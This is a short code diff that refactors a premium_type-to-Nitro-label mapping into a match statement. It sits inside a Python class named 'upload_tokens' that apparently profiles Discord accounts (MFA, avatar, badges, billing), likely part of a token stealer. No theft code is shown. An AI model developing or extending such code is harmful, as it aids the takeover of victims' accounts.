@@ -229,17 +229,20 @@ class upload_tokens:
             mfa = user['mfa_enabled']
             avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
             badges = ' '.join([flag[0] for flag in self.calc_flags(user['public_flags'])])
+            user_premium_type = user['premium_type']
             
-            if user['premium_type'] == 0:
-                nitro = 'None'
-            elif user['premium_type'] == 1:
-                nitro = 'Nitro Classic'
-            elif user['premium_type'] == 2:
-                nitro = 'Nitro'
-            elif user['premium_type'] == 3:
-                nitro = 'Nitro Basic'
-            else:
-                nitro = 'None'
+            
+            match user_premium_type:
+                case 0:
+                    nitro = 'None'
+                case 1:
+                    nitro = 'Nitro Classic'
+                case 2:
+                    nitro = 'Nitro'
+                case 3:
+                    nitro = 'Nitro Basic'
+                case _:
+                    nitro = 'None'
 
 
             if billing:
